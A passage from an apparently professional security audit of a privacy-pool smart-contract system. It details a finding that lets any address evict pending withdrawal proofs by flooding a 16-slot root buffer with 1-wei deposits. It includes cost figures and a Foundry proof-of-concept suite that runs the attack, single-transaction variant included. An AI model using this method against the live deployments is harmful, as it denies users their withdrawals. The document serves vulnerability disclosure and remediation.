    vm.prank(user);
    keystore.setAuthPolicy(7, 1);
    uint256 before = keystore.currentRoot();
    uint256[] memory sibs = new uint256[](0);
    vm.prank(user);
    keystore.updateAuthPolicy(7, 8, sibs);
    assertTrue(keystore.currentRoot() != before, 'root moved');
    assertTrue(keystore.isKnownRoot(before), 'old root still inside liveness');
  }

  /// EDGE deadline: deadline == 0 always expired; sig path rejects before any signature work.
  function test_SigDeadlineZeroExpires() external {
    vm.expectRevert(IKeystore.Keystore_SignatureExpired.selector);
    keystore.setAuthPolicyWithSig(user, 1, 1, 0, '');
  }

  /// EDGE zero address: address(0) cannot be registered through the signature path.
  function test_SigZeroAccountRejected() external {
    vm.expectRevert(IKeystore.Keystore_InvalidSignature.selector);
    keystore.setAuthPolicyWithSig(address(0), 1, 1, type(uint256).max, hex'00');
  }
}
```

What was not executed matters to the numbers above. The full 262,144-leaf fill was never run: the two capacity tests in the repository's own suite get there through `KeystoreHarness.exposed_setKeystoreTreeSize`, and that harness overrides `_insertInTree` with a mock that records the leaf and returns a canned root, so the fill is simulated rather than performed. The per-call gas is measured against the real `Keystore` and a real LeanIMT, but in a shallow tree: `setAuthPolicy` came in at 132,558 mean and 225,089 max over 13 calls, measured at the function level, and LeanIMT's amortised cost is roughly two Poseidon hashes per insert regardless of depth, so the extrapolation to about 5.2e10 gas, and the step from gas to ETH, are arithmetic rather than measurement. No fork run was made against Arbitrum or Base, and no attack was executed on any chain. The on-chain reads quoted here were read-only `eth_call` queries against the two live deployments.

#### Recommendation

We recommend metering registration so that a full fill costs an attacker far more than a few ETH. A flat registration fee routed to the `Entrypoint`, or a requirement that the registering account have an on-chain relationship to a deposit, is the smallest change that removes the unprivileged trigger, and `Keystore`'s UUPS upgradeability means it can be added in place without touching a circuit.

We also recommend making saturation observable and the escape routes documented. Expose the current leaf count as an external view on `IKeystore` and emit remaining capacity on insert, so operators see a fill coming before users hit it, and consider wiring `InternalLeanIMT._remove` behind a self-service `deregisterAuthPolicy()` that lets an abandoned stealth address return its slot. Document that `setKeystoreRootLiveness` can be raised before any cap raise, which lengthens the window in which superseded roots remain provable and is currently an undocumented in-place escape from the twenty-minute fuse. And either ship the depth-22 setup recorded against `#660` or remove it from `REMEDIATION_SUMMARY.md`, since it is currently recorded as the disposition for this exact mechanism while every circuit and every config still carries the depth-18 values.

#### Verification

**Verdict: CONFIRMED** by an executed proof of concept. The drop path, the run command and the expected output are given in the proof-of-concept section above.

### #020 — Any address can evict a live `PoolVault` state root by advancing its 16-slot ring with 1-wei deposits

**Severity:** Low · **Location:** `packages/contracts/src/abstracts/RootBufferUpgradeable.sol` · **Bug:** High · **Payout:** Low · **Novelty:** NEW · **Reach:** PERM · **Status:** Open

#### Description

A withdrawal from a pool is a zero-knowledge proof that the note being spent is in the pool's tree of notes. The prover reads the tree's leaves, builds the proof against the shape the tree had at that moment, which is identified by a single root hash, and submits it. Deposits and withdrawals by other users keep landing while that proof is built, and each one changes the root, so the pool remembers a short list of recent roots and accepts a proof anchored to any of them.

A proof whose root has fallen off the end of that list is rejected. Nothing is lost when that happens: the check runs before any state is written, the nullifier is not consumed and no value moves. The remedy is to build the proof again against a root that is still live, and it is entirely manual: neither the SDK nor the relayer checks whether a root is still live before spending on it, and neither retries a withdrawal the pool refused.

**Where it breaks.** The list is sized as though an entry in it cost something, and an entry costs the party consuming it nothing:

- the list holds sixteen roots and advances one slot per pool operation whatever that operation did, so a 1-wei deposit consumes as much of the window as a transact inserting ten leaves;
- deposits are open to any caller, the thirteen production asset rows set the minimum deposit to one base unit, one wei for ETH, the vetting fee on that amount truncates to zero, and the wei itself is recoverable, so an advance costs gas alone;
- the batched withdrawal path writes nine of the sixteen slots itself, so it tolerates six unrelated pool operations between the root it proves against and its own inclusion, not sixteen.

So sixteen deposits, which fit in a single transaction, evict any specific pending withdrawal, and seven destroy a full ten-item batch along with the gas the relayer paid for it, for a bill that does not move with the value being blocked or the number of users blocked with it.

Each `PoolVault` holds one append-only Merkle tree, a `LeanIMT`, of timestamped leaves, a commitment leaf per note created and a nullifier leaf per note spent. The tree's Merkle root is a public signal of every withdrawal and private-transfer proof, so a proof is bound to the one historical shape of the tree the SDK fetched leaves for when it began proving. The pool decides whether it still recognises that root from a fixed-size circular buffer: `RootBufferUpgradeable` keeps the last `rootHistorySize` roots, overwriting the oldest when full, and `PoolVault.transact` gates every withdrawal and every private transfer on membership in it.

```solidity
// PoolVault._validateAndVerify
function _validateAndVerify(ProofLibV2.TransactProof calldata _proof) internal {
    PoolVaultStorage storage $ = _getPoolVaultStorage();
    require(isKnownRoot(_proof.stateRoot()), PoolVault_UnknownStateRoot());
    require($.keystore.isKnownRoot(_proof.keyRegistryRoot()), PoolVault_UnknownKeystoreRoot());
    require(_proof.associationSetRoot() == $.aspRegistry.latestASPRoot(), PoolVault_InvalidASPRoot());
```

A proof whose root has fallen out of the buffer is rejected with `PoolVault_UnknownStateRoot`. The failure is fail-closed: the check is the first statement of `_validateAndVerify`, which `PoolVault.transact` reaches before the `$.spentNullifiers[_nullifierHash] = block.timestamp` write and before `_insertInStateTree`, so the call reverts whole, the nullifier is not consumed and no value moves. The user regenerates the proof against a currently live root and resubmits, and nothing in the protocol or the SDK does that for them.

The buffer advances one slot per pool operation rather than per leaf inserted or per unit of time. `RootBufferUpgradeable._updateRoot` is called once by `PoolVault.deposit`, once by `PoolVault.transact` however many leaves that transact inserted, and once by `PoolVault.ragequit`, with no deduplication and no timestamp, and `isKnownRoot` walks exactly `rootHistorySize` slots back from the head. `ChainConfigRegistry` sets `rootHistorySize: 16` in all four of its `SystemConfig` literals, including the one `_mainnetConfig` returns, so a proof is live for fifteen subsequent pool operations and dead on the sixteenth, and a 1-wei deposit inserting a single leaf consumes as much of that window as a ten-leaf transact.

Anyone controls the counter, and the irrecoverable cost of one advance is gas alone. `Entrypoint` holds `DEPOSITOR_ROLE` on the pool, and `Entrypoint.deposit` is `external payable` with no access modifier and no rate limit, so an arbitrary caller can drive a pool deposit against only the `_config.enabled` and `_value >= _config.minAmount` gates, and all thirteen production rows in `ChainAssetRegistry` ship `minAmount: 1`. No vetting fee closes that: `FeeCalculator.calcFee` returns `(_amount * _bps) / MAX_FEE_BPS` with `MAX_FEE_BPS = 10_000`, and `Entrypoint.setAssetConfiguration` requires `_config.vettingFeeBPS < FeeCalculator.MAX_FEE_BPS`, so at `_amount = 1` truncation makes the fee zero for every legal setting. The wei is not consumed either: it lands in the vault as principal and the depositor recovers it through `PoolVault.ragequit`, which advances the ring a second time on the way out.

Sixteen advances fit in a single transaction. `ProofLibV2.DepositProof` declares `uint256[4] pubSignals`, mapped to `outputCommitment`, `tokenId`, `value` and `context`; none is a state root, and `PoolVault.deposit` reads no root, so deposit proofs are independent of each other and of chain state and sixteen can be generated off-chain in parallel hours ahead. `PoolVault.deposit` carries `whenNotPaused` and `checkAccess(DEPOSITOR_ROLE)` but no `nonReentrant`, and `Entrypoint.deposit` restricts no caller, so one attacker contract makes all sixteen deposits in one transaction at one priority fee.

A second primitive spends no principal at all, which is why raising `minAmount` does not close this. `PoolVault.transact` requires only `_transactParams.processor == msg.sender`, so self-submission needs no relayer, and an identity transact with `amountOut = 0` and `tokenIdOut = address(0)` takes the else branch of the `_withdrawnValue > 0` test and never reaches `_transferAsset`, while the circuit is satisfied by equality on `ValueConservation`'s `totalIn === totalOut` constraint and its per-label `LessEqThan` check. The output note is immediately spendable again, so one unit of value cycles indefinitely at one proof and one transaction per advance. It needs a note already approved in the current association set, the compliance allowlist a transact has to prove against, which is why the dust deposit is the cheaper entry for an attacker starting with nothing.

The batched relay path leaves a six-operation margin, not a sixteen-operation one. `PrivacyPoolRelay.relayBatch` admits at most `_MAX_BATCH`, which is 10, enforced by its `_count <= _MAX_BATCH` check, and calls `POOL.transact` once per item in its loop. Every item proves against the same pre-batch snapshot root, and each item's `isKnownRoot` check runs after the earlier items' advances are written, so item k is validated `k-1` advances deep. Writing `U` for the unrelated pool operations landing between the snapshot and the batch's inclusion, the batch settles only while `U + 9 <= 15`, so `U <= 6`, and the seventh unrelated advance kills a full batch. `relayBatch` is one transaction, so items 1 through 9 revert with item 10 and the relayer pays their gas while settling nothing.

The repository already treats the coupling as settled, on terms the code does not support. The `require(_MAX_BATCH < _pool.rootHistorySize(), PrivacyPoolRelay_RootHistoryTooSmall())` guard in the `PrivacyPoolRelay` constructor is correct for what it addresses, since nine in-batch advances against sixteen slots always leave the shared snapshot present, but it says nothing about advances landing before the batch does, and the `_MAX_BATCH` declaration comment and the `MAX_BATCH` docblock in the SDK's `constant/BatchWithdraw.ts` both state without qualification that the coupling exists "so every batched transact validates against the shared pre-batch root snapshot". Residual B-1 in `agents/deviations.md` accepts that coupling as liveness-only and credits the relayer with re-checking it live before every batch through `assertBatchFitsRootHistory`, which it does not do: the module-level `rootHistorySizeCache` and `relayMaxBatchCache` maps in `evm.chain.service.ts` carry no TTL, and that method's own docstring says "the on-chain read happens at most once per pool per process". It compares sizes and never asks whether a particular root is still live. Neither client re-validates a root before spending on it, since `PoolVaultInteractor.isKnownRoot` is implemented in the SDK with no call site in the SDK's own logic, and the relayer's `parsePubSignals` lifts `stateRoot` out of the public signals and nothing reads it again.

The cost ratio runs against the attacker but the absolute cost does not deter. The attacker's deposit proofs are the cheapest circuit in the system, 2,061 constraints and 137 ms each in Config E, the configuration `docs/tech-design/circuits/circuits-benchmark.md` labels current production, and they are pre-computable in parallel; the victim's transact proof takes 1.54 s to 5.16 s by input and output count, per that document's Config E tables, and has to be regenerated against a live root each time. The seven advances that kill a batch cost a few cents of gas on Arbitrum or Base over 7 wei of principal that comes back.

No asset is ever at risk: the gate is fail-closed and sits ahead of every state write, no nullifier is burned, and `ragequit` is structurally immune because it reads a different root entirely. Availability is what is at risk, on the product's main withdrawal route, and the SDK's `TransactOrchestrator` contains no retry, backoff or freshness pre-check, so every recovery is a manual re-prove. `pause()` bounds the adversarial leg without mitigating it: `PoolVault.deposit` and `PoolVault.transact` are both `whenNotPaused`, leaving only `ragequit`, which burns one of the attacker's own notes per advance, but a pause blocks the victim's withdrawal too and does nothing about the same failure arising from ordinary traffic once throughput reaches roughly sixteen operations per proving window, where batches degrade first, at six.

#### Evidence

- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/contracts/src/abstracts/RootBufferUpgradeable.sol#L87-L96
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/contracts/src/contracts/PoolVault.sol#L352-L356
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/contracts/src/contracts/PrivacyPoolRelay.sol#L24-L28
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/contracts/src/contracts/PrivacyPoolRelay.sol#L164-L185
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/contracts/src/contracts/Entrypoint.sol#L57-L92
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/contracts/script/registries/ChainConfigRegistry.sol#L96-L110

#### Impact

The primary effect is repeatable denial of the relayed batch path at a price that does not scale with the damage. Seven advances in one transaction, measured at 1,751,502 gas excluding the mocked deposit verifications, kill a ten-item batch and can be repeated every time a new batch is broadcast; sixteen advances, measured at 4,024,660 gas on the same basis, evict any specific pending single withdrawal. Neither figure moves with the victim's size, the pool's balance or how many victims are in the batch. Funds recover completely and the user's recovery is manual: after a failed withdrawal the nullifier is unspent, the commitment record is byte-identical and the vault balance is unchanged, and the victim re-proves and resubmits without help from the SDK. The relayer's own exposure is narrower, because `simulateAndWriteRelay`, `simulateAndWriteRelayBatch` and `simulateAndWriteRelaySwap` all call `publicClient.simulateContract` before `walletClient.writeContract`, so it pays only when an advance lands between its simulation and the inclusion of its own transaction. Whether that gap is practically reachable depends on which RPC endpoint the operator points at, which we did not establish and record as an open question.

The emergency exit stays open, at a privacy cost. `PoolVault.ragequit`'s only root check is `$.keystore.isKnownRoot(_proof.keystoreRoot())`, a per-root timestamp window governed by `keystoreRootLiveness` rather than a fixed-size ring; it never reads the pool's own `isKnownRoot` and carries no `whenNotPaused`, so compressing the state-root ring cannot deny it. It is a public exit though: it requires `msg.sender == _proof.ownerAddress()` and its `Ragequit` event publishes the asset, the value, the commitment, the nullifier hash and the label, so a user who has to leave while the ring is being compressed pays for it in linkability.

#### Proof of concept

`RootWindowEviction.t.sol` drives the real `PoolVault` and the real `Entrypoint` behind real ERC1967 proxies, with real `LeanIMT` inserts and no root-buffer or pool-vault test harness in the path. Two things on the eviction path are mocked and both are disclosed here: the access router, configured deny-by-default so that `DEPOSITOR_ROLE` is granted only to the Entrypoint proxy and the attacker provably holds no role, and the deposit-circuit verifier, because the attacker generates real proofs off-chain and that step costs proving time rather than on-chain capital. The rest of the setup mirrors the shipped configuration: `rootHistorySize = 16`, ETH `minAmount = 1`, `vettingFeeBPS = 0`, `maxStateTreeSize = 2^22`. It was executed rather than reasoned, with `forge test --match-path test/unit/RootWindowEviction.t.sol` on forge 1.3.2-stable, solc 0.8.32, default profile: 6 passed and 0 failed. The four related existing suites still pass unchanged, 123 passed and 0 failed (`Entrypoint` 29, `PoolVault` 64, `PrivacyPoolRelayBatch` 19, `RootBufferUpgradeable` 11).

The counter-control leg is `test_SixteenDustDepositsEvictAWitnessRoot`. It asserts first that the attacker address holds no role on the access router, so the actor is provably unprivileged. A victim deposits, the resulting head root is captured, and the attacker then makes fifteen 1-wei deposits through the real `Entrypoint`, with the root asserted still known after each one; the sixteenth makes it unknown. Three post-conditions price the attack: total attacker principal is 16 wei, `address(entrypoint).balance == 0` so no vetting fee was retained anywhere, and `address(vault).balance == 17` so every wei sits in the vault as recoverable principal. The test would have failed, and the leg would have collapsed, if the deposit path had required a role of its caller, if any admissible fee had been retained, if the principal had been consumed rather than held, or if the root had survived the sixteenth advance. `test_WholeEvictionInASingleTransaction` repeats the eviction with all sixteen deposits driven from one attacker contract in one external call; it would have failed if `PoolVault.deposit` had carried a reentrancy or per-transaction guard.

The batch-margin leg is `test_RelayBatchToleratesSixUnrelatedOpsAndNotSeven`. On the real vault it takes a snapshot root, applies six unrelated advances, then the nine in-batch advances that items 1 through 9 of a full `relayBatch` would write, and asserts the snapshot is still known at the point item 10 would be checked. A seventh unrelated advance then makes it unknown. A margin larger than six would have failed the second assertion; a margin smaller than six would have failed the first. `PrivacyPoolRelay` itself is not deployed in the suite: each of the fifteen advances is driven as a pool operation against the real vault rather than through `relayBatch`. That is exact for this measurement, because `PoolVault.transact` calls `_updateRoot` exactly once per call, the same as `PoolVault.deposit`, so nine batched items write nine slots either way. What the leg establishes is the ring's behaviour under the advance count a full batch produces, not the relay contract's own code path.

`test_EvictedRootRevertsAndVictimLosesNothing` connects the eviction to the user-visible outcome. A transact anchored to the evicted root reverts with exactly `IPoolVault.PoolVault_UnknownStateRoot.selector`; the same call anchored to the current head clears that gate and dies further along, which isolates the gate as the only difference; and after the failure the nullifier is unspent, the commitment record is unchanged and the vault balance is unchanged. The control side of that comparison is weaker than the eviction side. The harness leaves the keystore, the ASP registry and the transact verifier router unconfigured, because none of them is on the eviction path that the suite exists to measure and `PoolVault.deposit` never reads them, so the fresh-root call dies at the keystore root check, the statement immediately after the state-root gate, and returns no revert data. What the test asserts there is that the selector is not `PoolVault_UnknownStateRoot` rather than that it is some other named error. The evicted-root call returning that selector is what proves execution reaches the gate at all, and the root is the only input that differs between the two calls.

What is measured and what is estimated. The figures `test_PriceOfOneEviction` reports, 4,024,660 gas for sixteen advances and 1,751,502 for seven, are real Poseidon hashing, real `LeanIMT` inserts and real storage writes, but they exclude the deposit-circuit Groth16 verification, which is mocked so the test isolates the buffer. An attempt to measure the real verifier in `test_RealDepositVerifierGas` failed: garbage curve points make the `ecPairing` precompile fail, a failing precompile consumes all the gas forwarded to it, and the 2,955,666 the test prints is simply the 3,000,000 cap it was given. That number is an artifact and we reject it. A snarkjs Groth16 verifier with four public inputs is conventionally 200,000 to 250,000 gas, which we treat as estimated, so one full eviction is roughly 4.0M measured plus 3.7M estimated and killing a batch is roughly 1.75M plus 1.6M. No fork test and no integration test was run for this finding, and no claim above rests on fork behaviour.

The negative claims, with the search behind each and the construct that would have refuted it. That `rootHistorySize` has no setter: `grep -rn "rootHistorySize" packages/contracts/src/` returns sixteen hits, of which exactly one is a write, the `$.rootHistorySize = _size` assignment inside `__RootBufferUpgradeable_init`, which is `onlyInitializing`; the rest are the `rootHistorySize()` getter, the two internal reads in `isKnownRoot` and `_updateRoot`, the interface declarations and the `PrivacyPoolRelay` constructor guard. Any `external` or `public` function assigning `$.rootHistorySize`, or a `reinitializer`-gated re-init, would falsify it, and there is neither; a test-only harness does expose a `setRootHistorySize`, and `PoolVault` does not inherit that harness. That the SDK never re-validates: `grep -rn "isKnownRoot" packages/sdk/src/` returns ten hits, all of them the implementation, the interface declaration or ABI entries, with no invocation from a service, orchestrator or hook, and any `.isKnownRoot(` call on a withdrawal path would falsify it, of which there is none. That the relayer never re-checks a specific root: `grep -rn "stateRoot" packages/relayer/relayer/src/` returns the `parsePubSignals` read plus two comments, and a `readContract` with `functionName: "isKnownRoot"` on the relay path would falsify it, of which there is none. That the SDK has no retry: `grep -n "retry\|Retry\|attempt"` over `TransactOrchestrator.ts` returns zero hits.

On live exposure, a read-only `eth_getLogs` sweep against both live `PoolVault` addresses on 2026-09-10, Arbitrum over 45,000 blocks (about 3 hours) and Base over 10,000 blocks in five 2,000-block chunks (about 5.5 hours, chunked because the public RPC caps the range at 2,000), returned zero `PoolVault` events on both. That establishes that the deployed pools were quiet in those windows, so organic traffic is nowhere near sixteen operations per proving window today and this is a deliberate attack rather than a capacity failure already in progress. It does not establish that the pools are unused, hold no value, or are out of production, and the mainnet address was not sampled.

The complete suite follows. `RootWindowEviction.t.sol` deploys the real `PoolVault` and the real `Entrypoint` behind ERC1967 proxies and drives every leg described above: the sixteen-deposit eviction and its price, the single-transaction variant, the six-versus-seven batch margin, the `PoolVault_UnknownStateRoot` consequence, and the deposit-verifier gas attempt we reject.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.32;

// Purpose: demonstrate the finding, against the REAL PoolVault
// and the REAL Entrypoint (no RootBufferHarness, real LeanIMT inserts, real access
// control), under the exact parameters ChainConfigRegistry ships to mainnet:
//  rootHistorySize = 16, ETH minAmount = 1 wei, vettingFeeBPS = 0.

import {IAccessControl} from '@openzeppelin/contracts/access/IAccessControl.sol';
import {ERC1967Proxy} from '@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol';

import {Entrypoint} from 'contracts/Entrypoint.sol';
import {PoolVault} from 'contracts/PoolVault.sol';
import {IASPRegistry} from 'interfaces/IASPRegistry.sol';
import {IEntrypoint} from 'interfaces/IEntrypoint.sol';
import {IKeystore} from 'interfaces/IKeystore.sol';
import {IPoolVault} from 'interfaces/IPoolVault.sol';
import {ITransactVerifierRouter} from 'interfaces/ITransactVerifierRouter.sol';
import {SNARK_SCALAR_FIELD} from 'lean-imt/Constants.sol';
import {ProofLibV2} from 'libraries/ProofLibV2.sol';
import {console} from 'forge-std/console.sol';
import {TestUtils} from 'test/unit/helpers/TestUtils.sol';
import {Constants} from 'utils/Constants.sol';
import {DEPOSITOR_ROLE, ENTRYPOINT_MANAGER_ROLE} from 'utils/RolesConstants.sol';
import {Groth16Verifier as DepositGroth16Verifier} from 'verifiers/deposit/groth16_verifier.sol';
import {Groth16Verifier as RagequitGroth16Verifier} from 'verifiers/ragequit/groth16_verifier.sol';

contract RootWindowEvictionPoC is TestUtils {
  using ProofLibV2 for ProofLibV2.DepositProof;

  /// @dev ChainConfigRegistry.sol:80/106/133/160 — Sepolia, MAINNET, Arbitrum, Base all use 16.
  uint32 internal constant ROOT_HISTORY_SIZE = 16;
  /// @dev sepolia-deployment-v9.md "System Config"
  uint256 internal constant MAX_STATE_TREE_SIZE = 1 << 22;
  /// @dev sepolia-deployment-v9.md "Configured Assets", ETH row
  uint256 internal constant ETH_MIN_AMOUNT = 1;
  uint256 internal constant ETH_VETTING_FEE_BPS = 0;

  PoolVault internal vault;
  Entrypoint internal entrypoint;

  RagequitGroth16Verifier internal mockRagequitVerifier = RagequitGroth16Verifier(makeAddr('mockRagequitVerifier'));
  DepositGroth16Verifier internal mockDepositVerifier = DepositGroth16Verifier(makeAddr('mockDepositVerifier'));

  address internal manager = makeAddr('entrypointManager');
  address internal attacker = makeAddr('attacker');
  address internal victim = makeAddr('victim');

  IPoolVault.NoteData internal noteData;
  uint256 internal noteContext;

  function setUp() external {
    // --- real PoolVault behind a real ERC1967 proxy ---
    PoolVault _vaultImpl = new PoolVault(IAccessControl(mockAccessRouter));
    vault = PoolVault(payable(address(new ERC1967Proxy(address(_vaultImpl), ''))));
    vault.initialize(
      ROOT_HISTORY_SIZE,
      new ITransactVerifierRouter.VerifierConfig[](0),
      IASPRegistry(mockAspRegistry),
      IKeystore(mockKeystore),
      mockRagequitVerifier,
      mockDepositVerifier,
      MAX_STATE_TREE_SIZE
    );

    // --- real Entrypoint behind a real ERC1967 proxy ---
    Entrypoint _epImpl = new Entrypoint(IAccessControl(mockAccessRouter));
    entrypoint = Entrypoint(payable(address(new ERC1967Proxy(address(_epImpl), ''))));
    entrypoint.initialize(IPoolVault(address(vault)));

    // --- access control: deny-by-default, grant only what the real deployment grants ---
    // catch-all: nobody has any role
    vm.mockCall(mockAccessRouter, abi.encodeWithSelector(IAccessControl.hasRole.selector), abi.encode(false));
    // deployment doc: DEPOSITOR = Entrypoint proxy
    vm.mockCall(
      mockAccessRouter, abi.encodeCall(IAccessControl.hasRole, (DEPOSITOR_ROLE, address(entrypoint))), abi.encode(true)
    );
    vm.mockCall(
      mockAccessRouter, abi.encodeCall(IAccessControl.hasRole, (ENTRYPOINT_MANAGER_ROLE, manager)), abi.encode(true)
    );

    // --- asset config mirrors the deployed ETH row exactly ---
    vm.prank(manager);
    entrypoint.setAssetConfiguration(
      Constants.NATIVE_ASSET,
      IEntrypoint.AssetConfig({
        enabled: true,
        minAmount: ETH_MIN_AMOUNT,
        vettingFeeBPS: ETH_VETTING_FEE_BPS,
        maxRelayFee: type(uint256).max
      })
    );

    // deposit-circuit Groth16 verification is mocked valid: the attacker generates real proofs
    // off-chain, which costs proving time but no on-chain capital. This test is about the buffer.
    vm.mockCall(
      address(mockDepositVerifier), abi.encodeWithSelector(DepositGroth16Verifier.verifyProof.selector), abi.encode(true)
    );

    noteData = IPoolVault.NoteData({hint: bytes32(0), data: ''});
    noteContext = uint256(keccak256(abi.encode(noteData))) % SNARK_SCALAR_FIELD;
  }

  /// @notice One permissionless 1-wei ETH deposit through the real Entrypoint. Advances the root by one.
  function _dustDeposit(address _who, uint256 _commitment) internal {
    ProofLibV2.DepositProof memory _proof;
    _proof.pA = [uint256(1), uint256(2)];
    _proof.pB = [[uint256(3), uint256(4)], [uint256(5), uint256(6)]];
    _proof.pC = [uint256(7), uint256(8)];
    _proof.pubSignals[0] = _commitment; // outputCommitment
    _proof.pubSignals[1] = uint256(uint160(Constants.NATIVE_ASSET)); // tokenId
    _proof.pubSignals[2] = ETH_MIN_AMOUNT; // value = 1 wei
    _proof.pubSignals[3] = noteContext; // context

    vm.deal(_who, _who.balance + ETH_MIN_AMOUNT);
    vm.prank(_who);
    entrypoint.deposit{value: ETH_MIN_AMOUNT}(_proof, noteData, '');
  }

  function _headRoot() internal view returns (uint256) {
    return vault.roots(vault.currentRootIndex());
  }

  /*//////////////////////////////////////////////////////////////
      case A — 16 dust deposits evict a witness root from the live buffer
  //////////////////////////////////////////////////////////////*/

  function test_SixteenDustDepositsEvictAWitnessRoot() external {
    // Permissionlessness, asserted against the real access router wiring:
    assertFalse(
      IAccessControl(mockAccessRouter).hasRole(DEPOSITOR_ROLE, attacker), 'attacker holds no role on the router'
    );

    // t0 — the victim deposits; the resulting root R is what their withdrawal proof anchors to.
    _dustDeposit(victim, 0xC1C701);
    uint256 _R = _headRoot();
    assertTrue(_R != 0, 'R is a real LeanIMT root');
    assertTrue(vault.isKnownRoot(_R), 'R is known at t0');

    uint256 _attackerSpend;

    // t1 — 15 unrelated pool operations. R must survive all of them.
    for (uint256 i = 1; i <= 15; ++i) {
      _dustDeposit(attacker, 0xA77ACC0000 + i);
      _attackerSpend += ETH_MIN_AMOUNT;
      assertTrue(vault.isKnownRoot(_R), 'R must survive 15 unrelated operations');
    }

    // t2 — the 16th. R falls out of the ring.
    _dustDeposit(attacker, 0xA77ACC0000 + 16);
    _attackerSpend += ETH_MIN_AMOUNT;
    assertFalse(vault.isKnownRoot(_R), 'R evicted after 16 operations');

    // --- the price of the attack ---
    assertEq(_attackerSpend, 16, 'total attacker principal to evict a root: 16 wei');
    // vettingFeeBPS = 0 -> the Entrypoint retains nothing, so 100% of principal sits in the vault
    // and is recoverable by the depositor via ragequit (PoolVault.sol:206-244).
    assertEq(address(entrypoint).balance, 0, 'no vetting fee is retained on dust deposits');
    assertEq(address(vault).balance, 17, 'all 17 wei (victim 1 + attacker 16) is vault principal');
  }

  /*//////////////////////////////////////////////////////////////
      case B — the relayBatch margin is 6, on the real vault
  //////////////////////////////////////////////////////////////*/

  /// @dev PrivacyPoolRelay._MAX_BATCH = 10; item k is isKnownRoot-checked after k-1 in-batch
  ///  advances, so the shared snapshot must survive (unrelated + 9). 6 works, 7 does not.
  function test_RelayBatchToleratesSixUnrelatedOpsAndNotSeven() external {
    _dustDeposit(victim, 0xBA7C40);
    uint256 _R = _headRoot();

    // 6 unrelated front-run advances
    for (uint256 i; i < 6; ++i) _dustDeposit(attacker, 0xB0000 + i);
    // 9 in-batch advances (items 1..9 settling); item 10 is checked here
    for (uint256 i; i < 9; ++i) {
      assertTrue(vault.isKnownRoot(_R), 'item must still find the shared snapshot');
      _dustDeposit(victim, 0xB1000 + i);
    }
    assertTrue(vault.isKnownRoot(_R), 'with 6 unrelated ops, item 10 settles');

    // the 7th unrelated advance is the one that kills it (6 + 9 + 1 = 16)
    _dustDeposit(attacker, 0xB2000);
    assertFalse(vault.isKnownRoot(_R), 'with 7 unrelated ops, item 10 reverts after 9 items burned gas');
  }

  /*//////////////////////////////////////////////////////////////
      case C — consequence: PoolVault_UnknownStateRoot, and the victim's state is untouched
  //////////////////////////////////////////////////////////////*/

  function test_EvictedRootRevertsAndVictimLosesNothing() external {
    _dustDeposit(victim, 0xC0FFEE);
    uint256 _R = _headRoot();

    for (uint256 i; i <= 15; ++i) _dustDeposit(attacker, 0xC10000 + i);
    assertFalse(vault.isKnownRoot(_R), 'R evicted');

    uint256 _nullifier = 0xDEADBEEF;
    uint256 _commitmentCreatedAt = vault.commitments(0xC0FFEE);

    // A transact anchored to the evicted root R fails at PoolVault.sol:354.
    bytes4 _sel = _transactRevertSelector(_R, _nullifier);
    assertEq(_sel, IPoolVault.PoolVault_UnknownStateRoot.selector, 'evicted root -> PoolVault_UnknownStateRoot');

    // The same call anchored to the CURRENT head passes the state-root gate and fails later
    // (the empty VerifierConfig router). The gate is the only difference.
    bytes4 _selFresh = _transactRevertSelector(_headRoot(), _nullifier);
    assertTrue(
      _selFresh != IPoolVault.PoolVault_UnknownStateRoot.selector, 'a fresh root clears the state-root gate'
    );

    // Recovery is automatic: nothing was consumed, so re-proving against a live root is all
    // the victim has to do. No nullifier burned, no commitment disturbed, no funds moved.
    assertEq(vault.spentNullifiers(_nullifier), 0, 'nullifier NOT consumed by the failed withdrawal');
    assertEq(vault.commitments(0xC0FFEE), _commitmentCreatedAt, 'deposit commitment record unchanged');
    assertTrue(_commitmentCreatedAt != 0, 'the victim commitment does exist');
    assertEq(address(vault).balance, 17, 'victim principal still in the vault');
  }

  /// @dev Calls transact and returns the revert selector (reverts the test if the call succeeds).
  function _transactRevertSelector(uint256 _stateRoot, uint256 _nullifier) internal returns (bytes4 _selector) {
    IPoolVault.TransactParams memory _params = IPoolVault.TransactParams({processor: address(this), data: ''});
    IPoolVault.NoteData[] memory _notes = new IPoolVault.NoteData[](0);

    ProofLibV2.TransactProof memory _proof;
    _proof.pA = [uint256(1), uint256(2)];
    _proof.pB = [[uint256(3), uint256(4)], [uint256(5), uint256(6)]];
    _proof.pC = [uint256(7), uint256(8)];
    _proof.pubSignals = new uint256[][](8);
    _proof.pubSignals[0] = new uint256[](1);
    _proof.pubSignals[0][0] = _nullifier; // nullifierHashes
    _proof.pubSignals[1] = new uint256[](0); // outputCommitments
    _proof.pubSignals[2] = new uint256[](1);
    _proof.pubSignals[2][0] = _stateRoot;
    _proof.pubSignals[3] = new uint256[](1);
    _proof.pubSignals[3][0] = 0; // keyRegistryRoot
    _proof.pubSignals[4] = new uint256[](1);
    _proof.pubSignals[4][0] = 0; // aspRoot
    _proof.pubSignals[5] = new uint256[](1);
    _proof.pubSignals[5][0] = 0; // amountOut
    _proof.pubSignals[6] = new uint256[](1);
    _proof.pubSignals[6][0] = 0; // tokenIdOut
    _proof.pubSignals[7] = new uint256[](1);
    _proof.pubSignals[7][0] = uint256(keccak256(abi.encode(_params, _notes))) % SNARK_SCALAR_FIELD;

    (bool _ok, bytes memory _ret) =
      address(vault).call(abi.encodeCall(IPoolVault.transact, (_proof, _params, _notes)));
    assertFalse(_ok, 'transact must not succeed in this harness');
    // The fresh-root path clears the state-root gate and dies later inside a mocked external
    // call, which returns no data. Report bytes4(0) for that case rather than failing.
    if (_ret.length < 4) return bytes4(0);
    assembly {
      _selector := mload(add(_ret, 0x20))
    }
  }

  /*//////////////////////////////////////////////////////////////
      case D — price the eviction in gas
  //////////////////////////////////////////////////////////////*/

